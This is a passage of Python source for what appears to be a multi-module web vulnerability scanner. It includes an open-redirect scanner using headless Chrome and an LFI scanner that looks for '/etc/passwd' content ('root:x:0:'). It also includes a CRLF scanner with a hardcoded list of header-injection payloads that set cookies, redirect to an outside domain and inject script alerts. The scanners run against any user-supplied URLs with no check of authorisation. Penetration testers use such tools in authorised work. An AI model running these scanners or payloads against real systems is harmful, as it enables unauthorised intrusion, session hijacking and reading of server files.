                save_results(scan_state['vulnerable_urls'], scan_state['total_found'], total_scanned, start_time)
                exit()

            print_scan_summary(scan_state['total_found'], total_scanned, start_time)
            save_results(scan_state['vulnerable_urls'], scan_state['total_found'], total_scanned, start_time)
            exit()


        if __name__ == "__main__":
            try:
                main()
            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] Scan interrupted by the user. Exiting...")
                sys.exit()


    def run_or_scanner(scan_state=None):
            

        init()

        scan_active = True
        executor = None
        drivers = []            
            
            
        def get_chrome_driver():
            if not scan_active:
                return None
                
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-browser-side-navigation")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.page_load_strategy = 'eager'
            logging.disable(logging.CRITICAL)

            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
            driver.set_page_load_timeout(15)
            drivers.append(driver)
            return driver


        def check_payload_with_selenium(url, payload, param_name=None):
            if not scan_active:
                return False
                
            driver = None
            try:
                driver = get_chrome_driver()
                if not driver:
                    return False
                    
                print(Fore.YELLOW + f"[→] Testing {param_name if param_name else 'path'}: {Fore.CYAN}{url}")
                
                driver.get(url)
                WebDriverWait(driver, 10).until(
                    lambda d: d.execute_script('return document.readyState') == 'complete'
                )
                
                current_url = driver.current_url.lower()
                
                if "google.com" in current_url:
                    if current_url.startswith("https://google.com") or "google.com" in current_url.split("/")[2]: 
                        if scan_state:
                            scan_state['vulnerability_found'] = True
                            scan_state['vulnerable_urls'].append(url)
                            scan_state['total_found'] += 1
                        print(Fore.GREEN + f"[✓] Vulnerable: {url}")
                        return True
                    else:
                        print(Fore.RED + f"[✗] Not Vulnerable: {url}")
                else:
                    print(Fore.RED + f"[✗] Not Vulnerable: {url}")
                
            except Exception as e:
                if scan_active:
                    print(Fore.RED + f"[!] Error: {str(e)}")
                return False
            finally:
                if driver and driver in drivers:
                    try:
                        driver.quit()
                        drivers.remove(driver)
                    except:
                        pass
            
            return False

        def test_open_redirect(url, payloads, max_threads=5):
            nonlocal scan_active, executor
            found_vulnerabilities = 0
            vulnerable_urls = []
            
            parsed = urllib.parse.urlparse(url)
            print(Fore.MAGENTA + f"[i] Parsed URL: {parsed}")
            
            if not parsed.scheme:
                url = 'http://' + url
                parsed = urllib.parse.urlparse(url)
            
            try:
                if not parsed.query:
                    print(Fore.YELLOW + "[i] No query parameters found. Testing path instead.")
                    path = parsed.path
                    
                    executor = ThreadPoolExecutor(max_workers=max_threads)
                    futures = []
                    
                    for payload in payloads:
                        if not scan_active:
                            break
                            
                        payload = payload.strip()
                        if not payload:
                            continue
                        
                        test_url = parsed._replace(path=path + payload)
                        
                        futures.append(
                            executor.submit(
                                check_payload_with_selenium,
                                url=urllib.parse.urlunparse(test_url),
                                payload=payload,
                                param_name='path'
                            )
                        )
                    
                    for future in as_completed(futures):
                        if not scan_active:
                            break
                        try:
                            if future.result():
                                found_vulnerabilities += 1
                                vulnerable_urls.append(urllib.parse.urlunparse(test_url))
                        except Exception as e:
                            if scan_active:
                                print(Fore.RED + f"[!] Error testing path: {str(e).splitlines()[0]}")
                    
                else:
                    query_params = {}
                    for param in parsed.query.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            query_params[key] = [value]
                        else:
                            query_params[param] = ['']
                    
                    print(Fore.YELLOW + f"\n[i] Query Params: {query_params}")
                    print(Fore.GREEN + f"\n[i] Found parameters: {', '.join(query_params.keys())}")
                    
                    executor = ThreadPoolExecutor(max_workers=max_threads)
                    futures = []
                    
                    for payload in payloads:
                        if not scan_active:
                            break
                            
                        payload = payload.strip()
                        if not payload:
                            continue
                        
                        for param in query_params:
                            if not scan_active:
                                break
                                
                            modified_params = query_params.copy()
                            modified_params[param] = [payload]
                            
                            test_url = urllib.parse.urlunparse(
                                parsed._replace(
                                    query=urllib.parse.urlencode(modified_params, doseq=True)
                                )
                            )
                            
                            futures.append(
                                executor.submit(
                                    check_payload_with_selenium, 
                                    test_url, 
                                    payload, 
                                    param
                                )
                            )
                    
                    for future in as_completed(futures):
                        if not scan_active:
                            break
                        try:
                            if future.result():
                                found_vulnerabilities += 1
                                vulnerable_urls.append(test_url)
                        except Exception as e:
                            if scan_active:
                                print(Fore.RED + f"[!] Error testing parameter: {str(e).splitlines()[0]}")
            

            except KeyboardInterrupt:
                print(Fore.MAGENTA + "\nPlease wait, cleaning up resources...")
                scan_active = False
                stop_event.set()

                for driver in drivers:
                    try:
                        driver.quit()
                    except:
                        pass
                drivers.clear()

                if executor is not None:
                    executor.shutdown(wait=False, cancel_futures=True)
                    
                print(Fore.YELLOW + "[!] Scan interrupted by user.")

                if scan_state and scan_state.get('vulnerability_found', False):
                    print(Fore.GREEN + f"\n[+] Partial results - Vulnerabilities found: {scan_state.get('total_found', 0)}")
                    if scan_state.get('vulnerable_urls'):
                        print(Fore.GREEN + "[+] Vulnerable URLs:")
                        for url in scan_state['vulnerable_urls']:
                            print(Fore.GREEN + f"    {url}")
                else:
                    print(Fore.YELLOW + "\n[-] Scan cancelled before completion")
                raise KeyboardInterrupt


            finally:

                if executor is not None:
                    executor.shutdown(wait=False)
                for driver in drivers:
                    try:
                        driver.quit()
                    except:
                        pass
                drivers.clear()

            return found_vulnerabilities, vulnerable_urls

        def get_file_path(prompt_text):
            if not scan_active:
                return None
            completer = PathCompleter()
            try:
                return prompt(prompt_text, completer=completer).strip()
            except:
                return None

        def prompt_for_urls():
            while scan_active:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if not scan_active:
                        return None
                        
                    if url_input is None:
                        return None
                        
                    if url_input:
                        if not os.path.isfile(url_input):
                            print(Fore.RED + f"[!] File not found: {url_input}")
                            continue
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.BLUE + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        print(Fore.RED + "[!] You must provide either a file with URLs or a single URL")
                except Exception as e:
                    print(Fore.RED + f"[!] Error: {str(e)}")
                    if not scan_active:
                        return None
                    if input(Fore.YELLOW + "[i] Press Enter to try again or 'q' to quit: ").strip().lower() == 'q':
                        return None

        def prompt_for_payloads():
            while scan_active:
                try:
                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                    if not scan_active:
                        return None
                        
                    if payload_input is None:
                        return None
                        
                    if not os.path.isfile(payload_input):
                        print(Fore.RED + f"[!] File not found: {payload_input}")
                        continue
                    with open(payload_input, 'r', encoding='utf-8') as f:
                        payloads = [line.strip() for line in f if line.strip()]
                    return payloads
                except Exception as e:
                    print(Fore.RED + f"[!] Error: {str(e)}")
                    if not scan_active:
                        return None
                    if input(Fore.YELLOW + "[i] Press Enter to try again or 'q' to quit: ").strip().lower() == 'q':
                        return None

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"

            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            if total_scanned > 0 and not vulnerable_urls:
                print(Fore.YELLOW + "\n[i] No vulnerabilities found.")
            elif not total_scanned:
                print(Fore.RED + "[!] No URLs were scanned.")

        clear_screen()

        panel = Panel(r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
         ── Open Redirect Scanner ──
            
                            """,
            style="bold green",
            border_style="cyan",
            expand=False
        )
        rich_print(panel, "\n")
        print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")

        try:
            urls = prompt_for_urls()
            payloads = prompt_for_payloads()

            max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
            max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5

            print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
            clear_screen()
            print(Fore.CYAN + "[i] Starting scan...\n")

            total_found = 0
            total_scanned = 0
            start_time = time.time()
            vulnerable_urls = []

            if scan_state is None:
                scan_state = {
                    'vulnerability_found': False,
                    'vulnerable_urls': [],
                    'total_found': 0,
                    'total_scanned': 0
                }

            if payloads:
                for url in urls:
                    current_scan_state = {
                        'vulnerability_found': False,
                        'vulnerable_urls': [],
                        'total_found': 0,
                        'total_scanned': 0
                    }
                    
                    box_content = f" → Scanning URL: {url} "
                    box_width = max(len(box_content) + 2, 40)
                    print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                    print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                    print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n\n")
                    
                    found, urls_with_payloads = test_open_redirect(url, payloads, max_threads)
                    total_found += found
                    total_scanned += len(payloads)
                    vulnerable_urls.extend(urls_with_payloads)

                    scan_state['vulnerability_found'] |= current_scan_state['vulnerability_found']
                    scan_state['vulnerable_urls'].extend(current_scan_state['vulnerable_urls'])
                    scan_state['total_found'] += current_scan_state['total_found']
                    scan_state['total_scanned'] += current_scan_state['total_scanned']

            print_scan_summary(total_found, total_scanned, start_time)
            save_results(vulnerable_urls, total_found, total_scanned, start_time)

            if scan_state['vulnerability_found']:
                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
                print(Fore.GREEN + f"[+] Vulnerable URLs:")
                for url in scan_state['vulnerable_urls']:
                    print(Fore.GREEN + f"    {url}")
            else:
                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")

            print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")

        except KeyboardInterrupt:
            print(Fore.MAGENTA + "Please wait, the threads will stop working in a few seconds...")
            stop_event.set()
            sleep(2)
            executor.shutdown(wait=True)

            print(Fore.YELLOW + "[!] Stopped all threads.")
            print(Fore.RED + "\n[!] Scan interrupted by user.")

            if scan_state and scan_state['vulnerability_found']:
                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
                print(Fore.GREEN + f"[+] Vulnerable URLs:")
                for url in scan_state['vulnerable_urls']:
                    print(Fore.GREEN + f"    {url}")
                
            else:
                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")
                print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")

            sys.exit()

    def run_lfi_scanner(scan_state=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        init(autoreset=True)

        def get_random_user_agent():
            return random.choice(USER_AGENTS)
        
        def check_and_install_packages(packages):
            for package, version in packages.items():
                try:
                    __import__(package)
                except ImportError:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])

        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
            session = requests.Session()
            retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session
        
        def test_lfi(url, payloads, success_criteria, max_threads=5):
            def check_payload(payload):
                encoded_payload = urllib.parse.quote(payload.strip())
                target_url = f"{url}{encoded_payload}"
                start_time = time.time()
                
                try:
                    response = requests.get(target_url)
                    response_time = round(time.time() - start_time, 2)
                    result = None
                    is_vulnerable = False
                    if response.status_code == 200:
                        is_vulnerable = any(re.search(pattern, response.text) for pattern in success_criteria)
                        if is_vulnerable:
                            result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
                        else:
                            result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
                    else:
                        result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"

                    if is_vulnerable and scan_state:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1
                    if scan_state:
                        scan_state['total_scanned'] += 1

                    return result, is_vulnerable
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
                    return None, False

            found_vulnerabilities = 0
            vulnerable_urls = []
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_payload, payload): payload for payload in payloads}
                for future in as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result, is_vulnerable = future.result()
                        if result:
                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload.strip()}")
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + urllib.parse.quote(payload.strip()))
                    except Exception as e:
                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
            return found_vulnerabilities, vulnerable_urls

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            pass
                
        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
                            clear_screen()
                            print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")

        def prompt_for_payloads():
            while True:
                try:
                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                    if not os.path.isfile(payload_input):
                        raise FileNotFoundError(f"File not found: {payload_input}")
                    with open(payload_input, 'r', encoding='utf-8') as f:
                        payloads = [line.strip() for line in f if line.strip()]
                    return payloads
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
                    
        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)


        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        clear_screen()

        required_packages = {
            'requests': '2.28.1',
            'prompt_toolkit': '3.0.36',
            'colorama': '0.4.6'
        }

        check_and_install_packages(required_packages)

        clear_screen()

        panel = Panel(
        r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
         ── LFI Scanner ──
                                                        
                                                  
            """,
        style="bold green",
        border_style="cyan",
        expand=False
        )
        rich_print(panel, "\n")

        print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")

        urls = prompt_for_urls()
        payloads = prompt_for_payloads()
        success_criteria_input = input("[?] Enter the success criteria patterns (comma-separated, e.g: 'root:,admin:', press Enter for 'root:x:0:'): ").strip()
        success_criteria = [pattern.strip() for pattern in success_criteria_input.split(',')] if success_criteria_input else ['root:x:0:']
        
        max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5

        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
        clear_screen()
        print(Fore.CYAN + "[i] Starting scan...\n")

        for url in urls:
            get_random_user_agent()

        total_found = 0
        total_scanned = 0
        start_time = time.time()
        vulnerable_urls = []

        if scan_state is None:
            scan_state = {
                'vulnerability_found': False,
                'vulnerable_urls': [],
                'total_found': 0,
                'total_scanned': 0
            }

        if payloads:
            for url in urls:
                box_content = f" → Scanning URL: {url} "
                box_width = max(len(box_content) + 2, 40)
                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                found, urls_with_payloads = test_lfi(url, payloads, success_criteria, max_threads)
                total_found += found
                total_scanned += len(payloads)
                vulnerable_urls.extend(urls_with_payloads)

        print_scan_summary(total_found, total_scanned, start_time)
        save_results(vulnerable_urls, total_found, total_scanned, start_time)

        if scan_state['vulnerability_found']:
            print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
            print(Fore.GREEN + f"[+] Vulnerable URLs:")
            for url in scan_state['vulnerable_urls']:
                print(Fore.GREEN + f"    {url}")
        else:
            print(Fore.YELLOW + "\n[-] No vulnerabilities found.")

        print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")

        exit()
        
    def run_crlf_scanner(scan_state=None):
        init(autoreset=True)

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        def get_domain(url):
            parsed_url = urlparse(url)
            return parsed_url.netloc

        def generate_payloads(url):
            domain = get_domain(url)
            base_payloads = [
                "/%%0a0aSet-Cookie:loxs=injected",
                "/%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%0d%0aLocation: http://loxs.pages.dev",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
                "/%0d%0aLocation: loxs.pages.dev",
                "/%0d%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
                "/%23%0aSet-Cookie:loxs=injected",
                "/%25%30%61Set-Cookie:loxs=injected",
                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
                "/%5Cr%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%u000ASet-Cookie:loxs=injected;",
                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
            ]
            
            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]

        REGEX_PATTERNS = [
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
        ]

        def get_random_user_agent():
            return random.choice(USER_AGENTS)

        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
            session = requests.Session()
            retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session

        def check_crlf_vulnerability(url, payload, scan_state=None):
            target_url = f"{url}{payload}"
            start_time = time.time()

            headers = {
                'User-Agent': get_random_user_agent(),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }

            result = None

            try:
                session = get_retry_session()
                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
                response_time = time.time() - start_time

                is_vulnerable = False
                vulnerability_details = []

                for header, value in response.headers.items():
                    combined_header = f"{header}: {value}"
                    if any(re.search(pattern, combined_header, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                        is_vulnerable = True
                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{combined_header}")

                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                    is_vulnerable = True
                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")

                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
                    if is_vulnerable:
                        result = (Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} "
                                f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                        if vulnerability_details:
                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
                    else:
                        result = (Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} "
                                f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")

                if scan_state:
                    scan_state['total_scanned'] += 1
                    if is_vulnerable:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1

                return result, is_vulnerable

            except requests.exceptions.RequestException as e:
                result = Fore.RED + f"[!] Error accessing {target_url}: {str(e)}"
                print(result)
                return result, False

        def test_crlf(url, max_threads=5):
            found_vulnerabilities = 0
            vulnerable_urls = []
            payloads = generate_payloads(url)

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
                for future in as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result, is_vulnerable = future.result()
                        if result:
                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + payload)
                    except Exception as e:
                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
            return found_vulnerabilities, vulnerable_urls

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            pass

        def get_file_path(prompt_text):
            return prompt(prompt_text, completer=PathCompleter())

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                            clear_screen()
                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
        
        clear_screen()
        panel = Panel(
        r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
         ── CRLF Injection Scanner ──

        """,
        style="bold green",
        border_style="cyan",
        expand=False
        )
        rich_print(panel, "\n")

        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")

        urls = prompt_for_urls()
        
        max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5

        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
        clear_screen()
        print(Fore.CYAN + "[i] Starting scan...\n")

        total_found = 0
        total_scanned = 0
        start_time = time.time()
        vulnerable_urls = []

        if scan_state is None:
            scan_state = {
                'vulnerability_found': False,
                'vulnerable_urls': [],
                'total_found': 0,
                'total_scanned': 0
            }

        for url in urls:
            box_content = f" → Scanning URL: {url} "
            box_width = max(len(box_content) + 2, 40)
            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")

            found, urls_with_payloads = test_crlf(url, max_threads)
            total_found += found
            total_scanned += len(generate_payloads(url))
            vulnerable_urls.extend(urls_with_payloads)

        print_scan_summary(total_found, total_scanned, start_time)
        save_results(vulnerable_urls, total_found, total_scanned, start_time)

        print(Fore.RED + "\nExiting...")
        exit()


    def handle_selection(selection):
        
        if selection == '1':
            clear_screen()
            run_lfi_scanner()

        elif selection == '2':
            clear_screen()
            run_or_scanner()

        elif selection == '3':
            clear_screen()
            run_sql_scanner()

        elif selection == '4':
            clear_screen()
            run_xss_scanner()

        elif selection == '5':
            clear_screen()
            run_crlf_scanner()

        elif selection == '6':
            clear_screen()
            print_exit_menu()

        else:
            print_exit_menu()

    stop_event = threading.Event()
